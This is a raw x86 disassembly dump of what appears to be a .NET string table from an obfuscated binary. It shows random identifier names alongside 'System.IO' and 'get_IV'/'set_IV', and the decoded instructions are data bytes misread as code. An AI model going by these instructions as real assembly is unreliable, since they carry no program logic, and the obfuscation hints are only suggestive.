  407b4e:	44                   	inc    %esp
  407b4f:	78 65                	js     0x407bb6
  407b51:	4f                   	dec    %edi
  407b52:	49                   	dec    %ecx
  407b53:	4a                   	dec    %edx
  407b54:	63 65 75             	arpl   %esp,0x75(%ebp)
  407b57:	49                   	dec    %ecx
  407b58:	00 45 71             	add    %al,0x71(%ebp)
  407b5b:	79 65                	jns    0x407bc2
  407b5d:	6b 55 53 42          	imul   $0x42,0x53(%ebp),%edx
  407b61:	46                   	inc    %esi
  407b62:	77 4f                	ja     0x407bb3
  407b64:	4a                   	dec    %edx
  407b65:	00 61 75             	add    %ah,0x75(%ecx)
  407b68:	67 53                	addr16 push %ebx
  407b6a:	4d                   	dec    %ebp
  407b6b:	61                   	popa
  407b6c:	47                   	inc    %edi
  407b6d:	67 59                	addr16 pop %ecx
  407b6f:	4a                   	dec    %edx
  407b70:	00 66 4c             	add    %ah,0x4c(%esi)
  407b73:	5a                   	pop    %edx
  407b74:	56                   	push   %esi
  407b75:	7a 77                	jp     0x407bee
  407b77:	6a 62                	push   $0x62
  407b79:	4d                   	dec    %ebp
  407b7a:	46                   	inc    %esi
  407b7b:	68 64 4a 00 4f       	push   $0x4f004a64
  407b80:	68 53 6c 76 61       	push   $0x61766c53
  407b85:	54                   	push   %esp
  407b86:	4e                   	dec    %esi
  407b87:	75 65                	jne    0x407bee
  407b89:	4a                   	dec    %edx
  407b8a:	00 67 75             	add    %ah,0x75(%edi)
  407b8d:	47                   	inc    %edi
  407b8e:	52                   	push   %edx
  407b8f:	58                   	pop    %eax
  407b90:	4a                   	dec    %edx
  407b91:	58                   	pop    %eax
  407b92:	6a 4b                	push   $0x4b
  407b94:	77 79                	ja     0x407c0f
  407b96:	65 4a                	gs dec %edx
  407b98:	00 59 4e             	add    %bl,0x4e(%ecx)
  407b9b:	79 66                	jns    0x407c03
  407b9d:	70 65                	jo     0x407c04
  407b9f:	63 69 65             	arpl   %ebp,0x65(%ecx)
  407ba2:	44                   	inc    %esp
  407ba3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba4:	6d                   	insl   (%dx),%es:(%edi)
  407ba5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ba6:	4a                   	dec    %edx
  407ba7:	00 74 56 43          	add    %dh,0x43(%esi,%edx,2)
  407bab:	67 72 76             	addr16 jb 0x407c24
  407bae:	51                   	push   %ecx
  407baf:	71 67                	jno    0x407c18
  407bb1:	7a 74                	jp     0x407c27
  407bb3:	4a                   	dec    %edx
  407bb4:	00 56 51             	add    %dl,0x51(%esi)
  407bb7:	57                   	push   %edi
  407bb8:	43                   	inc    %ebx
  407bb9:	79 44                	jns    0x407bff
  407bbb:	59                   	pop    %ecx
  407bbc:	75 66                	jne    0x407c24
  407bbe:	49                   	dec    %ecx
  407bbf:	76 4a                	jbe    0x407c0b
  407bc1:	00 4f 46             	add    %cl,0x46(%edi)
  407bc4:	79 42                	jns    0x407c08
  407bc6:	72 45                	jb     0x407c0d
  407bc8:	72 54                	jb     0x407c1e
  407bca:	7a 4a                	jp     0x407c16
  407bcc:	00 78 69             	add    %bh,0x69(%eax)
  407bcf:	47                   	inc    %edi
  407bd0:	4b                   	dec    %ebx
  407bd1:	59                   	pop    %ecx
  407bd2:	46                   	inc    %esi
  407bd3:	58                   	pop    %eax
  407bd4:	6d                   	insl   (%dx),%es:(%edi)
  407bd5:	4f                   	dec    %edi
  407bd6:	46                   	inc    %esi
  407bd7:	53                   	push   %ebx
  407bd8:	42                   	inc    %edx
  407bd9:	70 7a                	jo     0x407c55
  407bdb:	41                   	inc    %ecx
  407bdc:	4b                   	dec    %ebx
  407bdd:	00 42 79             	add    %al,0x79(%edx)
  407be0:	66 4a                	dec    %dx
  407be2:	71 6c                	jno    0x407c50
  407be4:	56                   	push   %esi
  407be5:	49                   	dec    %ecx
  407be6:	73 4a                	jae    0x407c32
  407be8:	4b                   	dec    %ebx
  407be9:	00 69 6b             	add    %ch,0x6b(%ecx)
  407bec:	69 65 47 69 4e 46 6b 	imul   $0x6b464e69,0x47(%ebp),%esp
  407bf3:	46                   	inc    %esi
  407bf4:	51                   	push   %ecx
  407bf5:	7a 55                	jp     0x407c4c
  407bf7:	4b                   	dec    %ebx
  407bf8:	00 5a 69             	add    %bl,0x69(%edx)
  407bfb:	5a                   	pop    %edx
  407bfc:	58                   	pop    %eax
  407bfd:	63 66 6a             	arpl   %esp,0x6a(%esi)
  407c00:	47                   	inc    %edi
  407c01:	75 61                	jne    0x407c64
  407c03:	4b                   	dec    %ebx
  407c04:	00 74 6b 55          	add    %dh,0x55(%ebx,%ebp,2)
  407c08:	6b 53 54 76          	imul   $0x76,0x54(%ebx),%edx
  407c0c:	52                   	push   %edx
  407c0d:	79 67                	jns    0x407c76
  407c0f:	72 68                	jb     0x407c79
  407c11:	4b                   	dec    %ebx
  407c12:	00 71 58             	add    %dh,0x58(%ecx)
  407c15:	69 58 63 6a 59 77 76 	imul   $0x7677596a,0x63(%eax),%ebx
  407c1c:	69 6b 77 55 6b 4b 00 	imul   $0x4b6b55,0x77(%ebx),%ebp
  407c23:	45                   	inc    %ebp
  407c24:	51                   	push   %ecx
  407c25:	56                   	push   %esi
  407c26:	51                   	push   %ecx
  407c27:	70 58                	jo     0x407c81
  407c29:	51                   	push   %ecx
  407c2a:	62 6e 58             	bound  %ebp,0x58(%esi)
  407c2d:	4f                   	dec    %edi
  407c2e:	78 4b                	js     0x407c7b
  407c30:	00 47 6c             	add    %al,0x6c(%edi)
  407c33:	4d                   	dec    %ebp
  407c34:	74 67                	je     0x407c9d
  407c36:	73 75                	jae    0x407cad
  407c38:	44                   	inc    %esp
  407c39:	74 77                	je     0x407cb2
  407c3b:	44                   	inc    %esp
  407c3c:	4c                   	dec    %esp
  407c3d:	00 50 73             	add    %dl,0x73(%eax)
  407c40:	4c                   	dec    %esp
  407c41:	55                   	push   %ebp
  407c42:	7a 79                	jp     0x407cbd
  407c44:	4b                   	dec    %ebx
  407c45:	49                   	dec    %ecx
  407c46:	55                   	push   %ebp
  407c47:	6f                   	outsl  %ds:(%esi),(%dx)
  407c48:	4b                   	dec    %ebx
  407c49:	50                   	push   %eax
  407c4a:	4c                   	dec    %esp
  407c4b:	00 62 66             	add    %ah,0x66(%edx)
  407c4e:	62 4c 71 58          	bound  %ecx,0x58(%ecx,%esi,2)
  407c52:	6c                   	insb   (%dx),%es:(%edi)
  407c53:	62 45 44             	bound  %eax,0x44(%ebp)
  407c56:	5a                   	pop    %edx
  407c57:	4c                   	dec    %esp
  407c58:	00 50 6b             	add    %dl,0x6b(%eax)
  407c5b:	48                   	dec    %eax
  407c5c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c5d:	6a 7a                	push   $0x7a
  407c5f:	4e                   	dec    %esi
  407c60:	44                   	inc    %esp
  407c61:	44                   	inc    %esp
  407c62:	62 4c 00 53          	bound  %ecx,0x53(%eax,%eax,1)
  407c66:	51                   	push   %ecx
  407c67:	6f                   	outsl  %ds:(%esi),(%dx)
  407c68:	67 4f                	addr16 dec %edi
  407c6a:	41                   	inc    %ecx
  407c6b:	6c                   	insb   (%dx),%es:(%edi)
  407c6c:	44                   	inc    %esp
  407c6d:	55                   	push   %ebp
  407c6e:	70 4c                	jo     0x407cbc
  407c70:	00 41 64             	add    %al,0x64(%ecx)
  407c73:	54                   	push   %esp
  407c74:	69 76 45 70 7a 68 57 	imul   $0x57687a70,0x45(%esi),%esi
  407c7b:	45                   	inc    %ebp
  407c7c:	74 4c                	je     0x407cca
  407c7e:	00 46 6a             	add    %al,0x6a(%esi)
  407c81:	58                   	pop    %eax
  407c82:	6e                   	outsb  %ds:(%esi),(%dx)
  407c83:	56                   	push   %esi
  407c84:	48                   	dec    %eax
  407c85:	48                   	dec    %eax
  407c86:	78 6b                	js     0x407cf3
  407c88:	46                   	inc    %esi
  407c89:	44                   	inc    %esp
  407c8a:	75 75                	jne    0x407d01
  407c8c:	4c                   	dec    %esp
  407c8d:	00 6b 6b             	add    %ch,0x6b(%ebx)
  407c90:	58                   	pop    %eax
  407c91:	4d                   	dec    %ebp
  407c92:	55                   	push   %ebp
  407c93:	69 48 56 64 70 78 4c 	imul   $0x4c787064,0x56(%eax),%ecx
  407c9a:	00 58 79             	add    %bl,0x79(%eax)
  407c9d:	75 42                	jne    0x407ce1
  407c9f:	79 4d                	jns    0x407cee
  407ca1:	58                   	pop    %eax
  407ca2:	74 78                	je     0x407d1c
  407ca4:	42                   	inc    %edx
  407ca5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ca6:	4f                   	dec    %edi
  407ca7:	4d                   	dec    %ebp
  407ca8:	00 48 68             	add    %cl,0x68(%eax)
  407cab:	49                   	dec    %ecx
  407cac:	57                   	push   %edi
  407cad:	50                   	push   %eax
  407cae:	57                   	push   %edi
  407caf:	53                   	push   %ebx
  407cb0:	4e                   	dec    %esi
  407cb1:	74 50                	je     0x407d03
  407cb3:	52                   	push   %edx
  407cb4:	4d                   	dec    %ebp
  407cb5:	00 65 73             	add    %ah,0x73(%ebp)
  407cb8:	74 66                	je     0x407d20
  407cba:	46                   	inc    %esi
  407cbb:	49                   	dec    %ecx
  407cbc:	65 6e                	outsb  %gs:(%esi),(%dx)
  407cbe:	63 45 58             	arpl   %eax,0x58(%ebp)
  407cc1:	52                   	push   %edx
  407cc2:	4d                   	dec    %ebp
  407cc3:	00 69 6d             	add    %ch,0x6d(%ecx)
  407cc6:	50                   	push   %eax
  407cc7:	69 6f 77 47 4b 50 68 	imul   $0x68504b47,0x77(%edi),%ebp
  407cce:	4d                   	dec    %ebp
  407ccf:	00 65 61             	add    %ah,0x61(%ebp)
  407cd2:	67 46                	addr16 inc %esi
  407cd4:	52                   	push   %edx
  407cd5:	58                   	pop    %eax
  407cd6:	57                   	push   %edi
  407cd7:	6c                   	insb   (%dx),%es:(%edi)
  407cd8:	6f                   	outsl  %ds:(%esi),(%dx)
  407cd9:	53                   	push   %ebx
  407cda:	6a 51                	push   $0x51
  407cdc:	6d                   	insl   (%dx),%es:(%edi)
  407cdd:	4d                   	dec    %ebp
  407cde:	00 53 74             	add    %dl,0x74(%ebx)
  407ce1:	65 7a 42             	gs jp  0x407d26
  407ce4:	63 4d 68             	arpl   %ecx,0x68(%ebp)
  407ce7:	7a 4d                	jp     0x407d36
  407ce9:	68 44 6a 6d 6d       	push   $0x6d6d6a44
  407cee:	6d                   	insl   (%dx),%es:(%edi)
  407cef:	4d                   	dec    %ebp
  407cf0:	00 43 72             	add    %al,0x72(%ebx)
  407cf3:	65 47                	gs inc %edi
  407cf5:	74 79                	je     0x407d70
  407cf7:	6d                   	insl   (%dx),%es:(%edi)
  407cf8:	50                   	push   %eax
  407cf9:	4e                   	dec    %esi
  407cfa:	45                   	inc    %ebp
  407cfb:	4e                   	dec    %esi
  407cfc:	57                   	push   %edi
  407cfd:	74 4d                	je     0x407d4c
  407cff:	00 46 58             	add    %al,0x58(%esi)
  407d02:	4b                   	dec    %ebx
  407d03:	63 4a 74             	arpl   %ecx,0x74(%edx)
  407d06:	6b 44 79 71 4d       	imul   $0x4d,0x71(%ecx,%edi,2),%eax
  407d0b:	78 61                	js     0x407d6e
  407d0d:	4f                   	dec    %edi
  407d0e:	70 46                	jo     0x407d56
  407d10:	4e                   	dec    %esi
  407d11:	00 79 78             	add    %bh,0x78(%ecx)
  407d14:	65 61                	gs popa
  407d16:	4e                   	dec    %esi
  407d17:	6c                   	insb   (%dx),%es:(%edi)
  407d18:	5a                   	pop    %edx
  407d19:	58                   	pop    %eax
  407d1a:	41                   	inc    %ecx
  407d1b:	5a                   	pop    %edx
  407d1c:	4e                   	dec    %esi
  407d1d:	4e                   	dec    %esi
  407d1e:	00 57 50             	add    %dl,0x50(%edi)
  407d21:	47                   	inc    %edi
  407d22:	51                   	push   %ecx
  407d23:	6c                   	insb   (%dx),%es:(%edi)
  407d24:	6b 67 72 64          	imul   $0x64,0x72(%edi),%esp
  407d28:	6f                   	outsl  %ds:(%esi),(%dx)
  407d29:	42                   	inc    %edx
  407d2a:	45                   	inc    %ebp
  407d2b:	56                   	push   %esi
  407d2c:	79 57                	jns    0x407d85
  407d2e:	4e                   	dec    %esi
  407d2f:	00 6e 78             	add    %ch,0x78(%esi)
  407d32:	42                   	inc    %edx
  407d33:	50                   	push   %eax
  407d34:	64 65 4f             	fs gs dec %edi
  407d37:	76 57                	jbe    0x407d90
  407d39:	59                   	pop    %ecx
  407d3a:	43                   	inc    %ebx
  407d3b:	61                   	popa
  407d3c:	4e                   	dec    %esi
  407d3d:	00 46 6f             	add    %al,0x6f(%esi)
  407d40:	79 4b                	jns    0x407d8d
  407d42:	67 6a 44             	addr16 push $0x44
  407d45:	58                   	pop    %eax
  407d46:	4e                   	dec    %esi
  407d47:	4c                   	dec    %esp
  407d48:	50                   	push   %eax
  407d49:	65 6a 4e             	gs push $0x4e
  407d4c:	00 65 72             	add    %ah,0x72(%ebp)
  407d4f:	6c                   	insb   (%dx),%es:(%edi)
  407d50:	54                   	push   %esp
  407d51:	4b                   	dec    %ebx
  407d52:	68 46 4e 6c 58       	push   $0x586c4e46
  407d57:	70 45                	jo     0x407d9e
  407d59:	70 4e                	jo     0x407da9
  407d5b:	00 4f 66             	add    %cl,0x66(%edi)
  407d5e:	4e                   	dec    %esi
  407d5f:	76 50                	jbe    0x407db1
  407d61:	48                   	dec    %eax
  407d62:	77 76                	ja     0x407dda
  407d64:	69 69 68 4d 70 4e 00 	imul   $0x4e704d,0x68(%ecx),%ebp
  407d6b:	53                   	push   %ebx
  407d6c:	47                   	inc    %edi
  407d6d:	43                   	inc    %ebx
  407d6e:	69 50 68 6d 65 61 74 	imul   $0x7461656d,0x68(%eax),%edx
  407d75:	4e                   	dec    %esi
  407d76:	00 53 79             	add    %dl,0x79(%ebx)
  407d79:	73 74                	jae    0x407def
  407d7b:	65 6d                	gs insl (%dx),%es:(%edi)
  407d7d:	2e 49                	cs dec %ecx
  407d7f:	4f                   	dec    %edi
  407d80:	00 4f 69             	add    %cl,0x69(%edi)
  407d83:	79 58                	jns    0x407ddd
  407d85:	4a                   	dec    %edx
  407d86:	76 79                	jbe    0x407e01
  407d88:	57                   	push   %edi
  407d89:	4c                   	dec    %esp
  407d8a:	4f                   	dec    %edi
  407d8b:	00 53 6b             	add    %dl,0x6b(%ebx)
  407d8e:	74 4b                	je     0x407ddb
  407d90:	56                   	push   %esi
  407d91:	52                   	push   %edx
  407d92:	57                   	push   %edi
  407d93:	78 4a                	js     0x407ddf
  407d95:	57                   	push   %edi
  407d96:	57                   	push   %edi
  407d97:	4f                   	dec    %edi
  407d98:	00 71 69             	add    %dh,0x69(%ecx)
  407d9b:	51                   	push   %ecx
  407d9c:	58                   	pop    %eax
  407d9d:	6f                   	outsl  %ds:(%esi),(%dx)
  407d9e:	6e                   	outsb  %ds:(%esi),(%dx)
  407d9f:	67 57                	addr16 push %edi
  407da1:	44                   	inc    %esp
  407da2:	46                   	inc    %esi
  407da3:	59                   	pop    %ecx
  407da4:	6c                   	insb   (%dx),%es:(%edi)
  407da5:	4e                   	dec    %esi
  407da6:	66 4f                	dec    %di
  407da8:	00 79 63             	add    %bh,0x63(%ecx)
  407dab:	4d                   	dec    %ebp
  407dac:	43                   	inc    %ebx
  407dad:	64 64 61             	fs fs popa
  407db0:	47                   	inc    %edi
  407db1:	71 50                	jno    0x407e03
  407db3:	64 66 4f             	fs dec %di
  407db6:	00 61 54             	add    %ah,0x54(%ecx)
  407db9:	5a                   	pop    %edx
  407dba:	56                   	push   %esi
  407dbb:	4d                   	dec    %ebp
  407dbc:	53                   	push   %ebx
  407dbd:	50                   	push   %eax
  407dbe:	6c                   	insb   (%dx),%es:(%edi)
  407dbf:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc0:	50                   	push   %eax
  407dc1:	50                   	push   %eax
  407dc2:	00 57 6e             	add    %dl,0x6e(%edi)
  407dc5:	4c                   	dec    %esp
  407dc6:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc7:	51                   	push   %ecx
  407dc8:	41                   	inc    %ecx
  407dc9:	4c                   	dec    %esp
  407dca:	42                   	inc    %edx
  407dcb:	41                   	inc    %ecx
  407dcc:	57                   	push   %edi
  407dcd:	50                   	push   %eax
  407dce:	00 69 4e             	add    %ch,0x4e(%ecx)
  407dd1:	4a                   	dec    %edx
  407dd2:	73 75                	jae    0x407e49
  407dd4:	53                   	push   %ebx
  407dd5:	46                   	inc    %esi
  407dd6:	67 56                	addr16 push %esi
  407dd8:	6a 58                	push   $0x58
  407dda:	50                   	push   %eax
  407ddb:	00 64 52 4f          	add    %ah,0x4f(%edx,%edx,2)
  407ddf:	6a 73                	push   $0x73
  407de1:	4f                   	dec    %edi
  407de2:	49                   	dec    %ecx
  407de3:	53                   	push   %ebx
  407de4:	71 5a                	jno    0x407e40
  407de6:	50                   	push   %eax
  407de7:	00 6c 6d 69          	add    %ch,0x69(%ebp,%ebp,2)
  407deb:	64 66 6b 43 78 49    	imul   $0x49,%fs:0x78(%ebx),%ax
  407df1:	5a                   	pop    %edx
  407df2:	57                   	push   %edi
  407df3:	65 50                	gs push %eax
  407df5:	00 45 77             	add    %al,0x77(%ebp)
  407df8:	53                   	push   %ebx
  407df9:	42                   	inc    %edx
  407dfa:	50                   	push   %eax
  407dfb:	77 51                	ja     0x407e4e
  407dfd:	57                   	push   %edi
  407dfe:	6a 50                	push   $0x50
  407e00:	00 6a 44             	add    %ch,0x44(%edx)
  407e03:	66 72 6a             	data16 jb 0x407e70
  407e06:	5a                   	pop    %edx
  407e07:	66 50                	push   %ax
  407e09:	59                   	pop    %ecx
  407e0a:	5a                   	pop    %edx
  407e0b:	68 6b 50 00 59       	push   $0x5900506b
  407e10:	46                   	inc    %esi
  407e11:	55                   	push   %ebp
  407e12:	4b                   	dec    %ebx
  407e13:	77 67                	ja     0x407e7c
  407e15:	72 57                	jb     0x407e6e
  407e17:	6e                   	outsb  %ds:(%esi),(%dx)
  407e18:	6f                   	outsl  %ds:(%esi),(%dx)
  407e19:	50                   	push   %eax
  407e1a:	00 45 57             	add    %al,0x57(%ebp)
  407e1d:	64 50                	fs push %eax
  407e1f:	5a                   	pop    %edx
  407e20:	63 54 79 66          	arpl   %edx,0x66(%ecx,%edi,2)
  407e24:	46                   	inc    %esi
  407e25:	57                   	push   %edi
  407e26:	7a 6f                	jp     0x407e97
  407e28:	50                   	push   %eax
  407e29:	00 6a 74             	add    %ch,0x74(%edx)
  407e2c:	55                   	push   %ebp
  407e2d:	79 45                	jns    0x407e74
  407e2f:	45                   	inc    %ebp
  407e30:	47                   	inc    %edi
  407e31:	4c                   	dec    %esp
  407e32:	6d                   	insl   (%dx),%es:(%edi)
  407e33:	54                   	push   %esp
  407e34:	77 50                	ja     0x407e86
  407e36:	00 6f 71             	add    %ch,0x71(%edi)
  407e39:	4f                   	dec    %edi
  407e3a:	5a                   	pop    %edx
  407e3b:	6c                   	insb   (%dx),%es:(%edi)
  407e3c:	4d                   	dec    %ebp
  407e3d:	51                   	push   %ecx
  407e3e:	62 45 61             	bound  %eax,0x61(%ebp)
  407e41:	4c                   	dec    %esp
  407e42:	78 7a                	js     0x407ebe
  407e44:	50                   	push   %eax
  407e45:	00 45 72             	add    %al,0x72(%ebp)
  407e48:	4b                   	dec    %ebx
  407e49:	4e                   	dec    %esi
  407e4a:	63 64 70 46          	arpl   %esp,0x46(%eax,%esi,2)
  407e4e:	4d                   	dec    %ebp
  407e4f:	6b 41 70 47          	imul   $0x47,0x70(%ecx),%eax
  407e53:	51                   	push   %ecx
  407e54:	00 51 4b             	add    %dl,0x4b(%ecx)
  407e57:	69 72 4e 54 49 6a 46 	imul   $0x466a4954,0x4e(%edx),%esi
  407e5e:	62 4f 69             	bound  %ecx,0x69(%edi)
  407e61:	73 4a                	jae    0x407ead
  407e63:	48                   	dec    %eax
  407e64:	63 51 00             	arpl   %edx,0x0(%ecx)
  407e67:	54                   	push   %esp
  407e68:	56                   	push   %esi
  407e69:	79 71                	jns    0x407edc
  407e6b:	42                   	inc    %edx
  407e6c:	79 47                	jns    0x407eb5
  407e6e:	53                   	push   %ebx
  407e6f:	5a                   	pop    %edx
  407e70:	68 4c 75 69 51       	push   $0x5169754c
  407e75:	00 61 66             	add    %ah,0x66(%ecx)
  407e78:	75 47                	jne    0x407ec1
  407e7a:	76 77                	jbe    0x407ef3
  407e7c:	72 57                	jb     0x407ed5
  407e7e:	72 6b                	jb     0x407eeb
  407e80:	6b 78 49 62          	imul   $0x62,0x49(%eax),%edi
  407e84:	77 51                	ja     0x407ed7
  407e86:	00 4a 54             	add    %cl,0x54(%edx)
  407e89:	59                   	pop    %ecx
  407e8a:	47                   	inc    %edi
  407e8b:	72 5a                	jb     0x407ee7
  407e8d:	55                   	push   %ebp
  407e8e:	50                   	push   %eax
  407e8f:	41                   	inc    %ecx
  407e90:	52                   	push   %edx
  407e91:	00 79 42             	add    %bh,0x42(%ecx)
  407e94:	63 41 50             	arpl   %eax,0x50(%ecx)
  407e97:	6b 44 6c 6a 76       	imul   $0x76,0x6a(%esp,%ebp,2),%eax
  407e9c:	72 6c                	jb     0x407f0a
  407e9e:	52                   	push   %edx
  407e9f:	00 72 6a             	add    %dh,0x6a(%edx)
  407ea2:	57                   	push   %edi
  407ea3:	78 63                	js     0x407f08
  407ea5:	6a 50                	push   $0x50
  407ea7:	57                   	push   %edi
  407ea8:	71 4b                	jno    0x407ef5
  407eaa:	7a 68                	jp     0x407f14
  407eac:	74 52                	je     0x407f00
  407eae:	00 53 71             	add    %dl,0x71(%ebx)
  407eb1:	54                   	push   %esp
  407eb2:	63 6c 64 6d          	arpl   %ebp,0x6d(%esp,%eiz,2)
  407eb6:	6d                   	insl   (%dx),%es:(%edi)
  407eb7:	78 75                	js     0x407f2e
  407eb9:	6b 76 52 00          	imul   $0x0,0x52(%esi),%esi
  407ebd:	66 63 61 53          	arpl   %sp,0x53(%ecx)
  407ec1:	49                   	dec    %ecx
  407ec2:	50                   	push   %eax
  407ec3:	57                   	push   %edi
  407ec4:	4a                   	dec    %edx
  407ec5:	61                   	popa
  407ec6:	61                   	popa
  407ec7:	7a 78                	jp     0x407f41
  407ec9:	52                   	push   %edx
  407eca:	00 45 4b             	add    %al,0x4b(%ebp)
  407ecd:	68 45 59 46 46       	push   $0x46465945
  407ed2:	51                   	push   %ecx
  407ed3:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed4:	66 41                	inc    %cx
  407ed6:	53                   	push   %ebx
  407ed7:	00 61 64             	add    %ah,0x64(%ecx)
  407eda:	59                   	pop    %ecx
  407edb:	50                   	push   %eax
  407edc:	48                   	dec    %eax
  407edd:	75 73                	jne    0x407f52
  407edf:	56                   	push   %esi
  407ee0:	54                   	push   %esp
  407ee1:	52                   	push   %edx
  407ee2:	6b 50 46 53          	imul   $0x53,0x46(%eax),%edx
  407ee6:	00 71 70             	add    %dh,0x70(%ecx)
  407ee9:	77 58                	ja     0x407f43
  407eeb:	44                   	inc    %esp
  407eec:	55                   	push   %ebp
  407eed:	74 52                	je     0x407f41
  407eef:	4c                   	dec    %esp
  407ef0:	53                   	push   %ebx
  407ef1:	00 45 6e             	add    %al,0x6e(%ebp)
  407ef4:	54                   	push   %esp
  407ef5:	72 74                	jb     0x407f6b
  407ef7:	75 58                	jne    0x407f51
  407ef9:	6a 55                	push   $0x55
  407efb:	41                   	inc    %ecx
  407efc:	4a                   	dec    %edx
  407efd:	61                   	popa
  407efe:	53                   	push   %ebx
  407eff:	00 59 41             	add    %bl,0x41(%ecx)
  407f02:	41                   	inc    %ecx
  407f03:	7a 45                	jp     0x407f4a
  407f05:	4b                   	dec    %ebx
  407f06:	6c                   	insb   (%dx),%es:(%edi)
  407f07:	6a 63                	push   $0x63
  407f09:	5a                   	pop    %edx
  407f0a:	6d                   	insl   (%dx),%es:(%edi)
  407f0b:	61                   	popa
  407f0c:	72 68                	jb     0x407f76
  407f0e:	53                   	push   %ebx
  407f0f:	00 77 6e             	add    %dh,0x6e(%edi)
  407f12:	43                   	inc    %ebx
  407f13:	78 73                	js     0x407f88
  407f15:	61                   	popa
  407f16:	75 6b                	jne    0x407f83
  407f18:	55                   	push   %ebp
  407f19:	76 71                	jbe    0x407f8c
  407f1b:	6e                   	outsb  %ds:(%esi),(%dx)
  407f1c:	51                   	push   %ecx
  407f1d:	6f                   	outsl  %ds:(%esi),(%dx)
  407f1e:	53                   	push   %ebx
  407f1f:	00 50 61             	add    %dl,0x61(%eax)
  407f22:	56                   	push   %esi
  407f23:	77 6f                	ja     0x407f94
  407f25:	70 72                	jo     0x407f99
  407f27:	6d                   	insl   (%dx),%es:(%edi)
  407f28:	63 4d 72             	arpl   %ecx,0x72(%ebp)
  407f2b:	53                   	push   %ebx
  407f2c:	00 64 75 6b          	add    %ah,0x6b(%ebp,%esi,2)
  407f30:	6a 66                	push   $0x66
  407f32:	79 4a                	jns    0x407f7e
  407f34:	6b 47 54 77          	imul   $0x77,0x54(%edi),%eax
  407f38:	52                   	push   %edx
  407f39:	45                   	inc    %ebp
  407f3a:	54                   	push   %esp
  407f3b:	00 4d 57             	add    %cl,0x57(%ebp)
  407f3e:	51                   	push   %ecx
  407f3f:	6c                   	insb   (%dx),%es:(%edi)
  407f40:	63 70 42             	arpl   %esi,0x42(%eax)
  407f43:	42                   	inc    %edx
  407f44:	6f                   	outsl  %ds:(%esi),(%dx)
  407f45:	74 62                	je     0x407fa9
  407f47:	4a                   	dec    %edx
  407f48:	54                   	push   %esp
  407f49:	00 66 49             	add    %ah,0x49(%esi)
  407f4c:	64 4c                	fs dec %esp
  407f4e:	6a 4a                	push   $0x4a
  407f50:	62 58 72             	bound  %ebx,0x72(%eax)
  407f53:	79 6e                	jns    0x407fc3
  407f55:	4b                   	dec    %ebx
  407f56:	54                   	push   %esp
  407f57:	00 6a 7a             	add    %ch,0x7a(%edx)
  407f5a:	67 62 65 7a          	bound  %esp,0x7a(%di)
  407f5e:	6a 4b                	push   $0x4b
  407f60:	4e                   	dec    %esi
  407f61:	67 52                	addr16 push %edx
  407f63:	54                   	push   %esp
  407f64:	00 4a 71             	add    %cl,0x71(%edx)
  407f67:	42                   	inc    %edx
  407f68:	4f                   	dec    %edi
  407f69:	56                   	push   %esi
  407f6a:	67 73 62             	addr16 jae 0x407fcf
  407f6d:	72 65                	jb     0x407fd4
  407f6f:	54                   	push   %esp
  407f70:	00 78 78             	add    %bh,0x78(%eax)
  407f73:	42                   	inc    %edx
  407f74:	6d                   	insl   (%dx),%es:(%edi)
  407f75:	5a                   	pop    %edx
  407f76:	6e                   	outsb  %ds:(%esi),(%dx)
  407f77:	79 4d                	jns    0x407fc6
  407f79:	41                   	inc    %ecx
  407f7a:	6c                   	insb   (%dx),%es:(%edi)
  407f7b:	54                   	push   %esp
  407f7c:	00 46 6e             	add    %al,0x6e(%esi)
  407f7f:	43                   	inc    %ebx
  407f80:	70 56                	jo     0x407fd8
  407f82:	43                   	inc    %ebx
  407f83:	6f                   	outsl  %ds:(%esi),(%dx)
  407f84:	53                   	push   %ebx
  407f85:	45                   	inc    %ebp
  407f86:	45                   	inc    %ebp
  407f87:	6c                   	insb   (%dx),%es:(%edi)
  407f88:	54                   	push   %esp
  407f89:	00 51 4e             	add    %dl,0x4e(%ecx)
  407f8c:	50                   	push   %eax
  407f8d:	52                   	push   %edx
  407f8e:	47                   	inc    %edi
  407f8f:	62 6c 51 66          	bound  %ebp,0x66(%ecx,%edx,2)
  407f93:	41                   	inc    %ecx
  407f94:	77 74                	ja     0x40800a
  407f96:	6e                   	outsb  %ds:(%esi),(%dx)
  407f97:	54                   	push   %esp
  407f98:	00 6f 64             	add    %ch,0x64(%edi)
  407f9b:	6f                   	outsl  %ds:(%esi),(%dx)
  407f9c:	69 64 41 66 6c 75 54 	imul   $0x54756c,0x66(%ecx,%eax,2),%esp
  407fa3:	00 
  407fa4:	4d                   	dec    %ebp
  407fa5:	6e                   	outsb  %ds:(%esi),(%dx)
  407fa6:	71 70                	jno    0x408018
  407fa8:	51                   	push   %ecx
  407fa9:	78 75                	js     0x408020
  407fab:	52                   	push   %edx
  407fac:	63 6c 47 55          	arpl   %ebp,0x55(%edi,%eax,2)
  407fb0:	00 73 76             	add    %dh,0x76(%ebx)
  407fb3:	5a                   	pop    %edx
  407fb4:	62 77 6d             	bound  %esi,0x6d(%edi)
  407fb7:	67 65 42             	addr16 gs inc %edx
  407fba:	75 74                	jne    0x408030
  407fbc:	50                   	push   %eax
  407fbd:	55                   	push   %ebp
  407fbe:	00 79 52             	add    %bh,0x52(%ecx)
  407fc1:	61                   	popa
  407fc2:	74 6c                	je     0x408030
  407fc4:	69 70 61 65 6a 6b 6a 	imul   $0x6a6b6a65,0x61(%eax),%esi
  407fcb:	55                   	push   %ebp
  407fcc:	00 76 4f             	add    %dh,0x4f(%esi)
  407fcf:	6d                   	insl   (%dx),%es:(%edi)
  407fd0:	61                   	popa
  407fd1:	63 76 4c             	arpl   %esi,0x4c(%esi)
  407fd4:	5a                   	pop    %edx
  407fd5:	6a 42                	push   $0x42
  407fd7:	57                   	push   %edi
  407fd8:	58                   	pop    %eax
  407fd9:	6b 55 00 67          	imul   $0x67,0x0(%ebp),%edx
  407fdd:	65 74 5f             	gs je  0x40803f
  407fe0:	49                   	dec    %ecx
  407fe1:	56                   	push   %esi
  407fe2:	00 73 65             	add    %dh,0x65(%ebx)
  407fe5:	74 5f                	je     0x408046
  407fe7:	49                   	dec    %ecx
  407fe8:	56                   	push   %esi
  407fe9:	00 47 65             	add    %al,0x65(%edi)
  407fec:	6e                   	outsb  %ds:(%esi),(%dx)
  407fed:	65 72 61             	gs jb  0x408051
  407ff0:	74 65                	je     0x408057
